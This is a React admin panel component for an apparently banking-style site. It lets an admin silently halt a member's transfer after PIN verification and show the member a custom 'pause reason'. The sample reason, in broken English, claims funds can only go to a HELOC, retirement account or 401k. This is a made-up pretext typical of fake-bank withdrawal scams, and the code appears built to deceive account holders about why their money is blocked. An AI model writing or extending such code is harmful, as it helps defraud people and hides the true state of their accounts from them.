"use client";

import { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import {
  AdminActionFeedback,
  type AdminFeedback,
} from "@/components/admin/admin-action-feedback";
import { adminButtonNeutral } from "@/components/admin/admin-button-styles";
import type { MemberRecord } from "@/components/admin/member-admin-types";
import { cn } from "@/lib/utils";

interface MemberPauseTransfersPanelProps {
  selected: MemberRecord;
  onUpdated: () => void;
}

export function MemberPauseTransfersPanel({
  selected,
  onUpdated,
}: MemberPauseTransfersPanelProps) {
  const [busy, setBusy] = useState(false);
  const [feedback, setFeedback] = useState<AdminFeedback>(null);
  const [pauseTransfers, setPauseTransfers] = useState(selected.pause_transfers);
  const [transferPauseReason, setTransferPauseReason] = useState(
    selected.transfer_pause_reason ?? ""
  );

  useEffect(() => {
    setPauseTransfers(selected.pause_transfers);
    setTransferPauseReason(selected.transfer_pause_reason ?? "");
  }, [selected.pause_transfers, selected.transfer_pause_reason]);

  return (
    <Card className="rounded-2xl border-white/10 bg-[#0f2233] text-white shadow-none">
      <CardHeader>
        <CardTitle className="font-heading text-lg">Pause Transfer</CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        <p className="text-sm text-white/55">
          When enabled, this member&apos;s next transfer will pass PIN verification but
          stop during processing. The member sees your pause reason — not an incorrect
          PIN message.
        </p>
        <div className="space-y-2">
          <Label className="text-white/70">Pause reason (shown to member)</Label>
          <textarea
            value={transferPauseReason}
            onChange={(event) => setTransferPauseReason(event.target.value)}
            placeholder="e.g. Sorry the transaction from this account can only goes to Home Equity Line Of Credit (HELOC), Retirements Account Or 401k"
            rows={4}
            className="w-full rounded-xl border border-white/15 bg-[#06121c] px-3 py-2 text-sm text-white placeholder:text-white/35"
          />
        </div>
        <Button
          type="button"
          disabled={busy}
          onClick={async () => {
            const next = !pauseTransfers;
            if (next && !transferPauseReason.trim()) {
              setFeedback({
                type: "error",
                text: "Enter a pause reason before enabling Pause Transfer.",
              });
              return;
            }
            setPauseTransfers(next);
            setBusy(true);
            setFeedback(null);
            const response = await fetch(`/api/admin/members/${selected.id}`, {
              method: "PATCH",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                pauseTransfers: next,
                transferPauseReason: transferPauseReason.trim(),
              }),
            });
            const data = await response.json();
            setBusy(false);

            if (!response.ok) {
              setPauseTransfers(!next);
              setFeedback({ type: "error", text: data.error ?? "Update failed." });
              return;
            }

            setFeedback({
              type: "success",
              text: next
                ? "PAUSE TRANSFER is ON — member will see your reason during processing."
                : "PAUSE TRANSFER is OFF — transfers proceed normally.",
            });
            onUpdated();
          }}
          className={
            pauseTransfers
              ? "w-full bg-red-500/90 text-white hover:bg-red-500"
              : "w-full bg-northium-gold text-[#06121c] hover:bg-northium-gold/90"
          }
        >
          {pauseTransfers ? "PAUSE TRANSFER — ON" : "PAUSE TRANSFER — OFF"}
        </Button>
        <Button
          type="button"
          variant="outline"
          disabled={busy || !pauseTransfers}
          onClick={async () => {
            if (!transferPauseReason.trim()) {
              setFeedback({
                type: "error",
                text: "Enter a pause reason to save.",
              });
              return;
            }
            setBusy(true);
            setFeedback(null);
            const response = await fetch(`/api/admin/members/${selected.id}`, {
              method: "PATCH",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                transferPauseReason: transferPauseReason.trim(),
              }),
            });
            const data = await response.json();
            setBusy(false);

            if (!response.ok) {
              setFeedback({
                type: "error",
                text: data.error ?? "Failed to save pause reason.",
              });
              return;
            }

            setFeedback({ type: "success", text: "Pause reason saved." });
            onUpdated();
          }}
          className={cn("w-full", adminButtonNeutral)}
        >
          Save Pause Reason
        </Button>
        <AdminActionFeedback feedback={feedback} />
      </CardContent>
    </Card>
  );
}
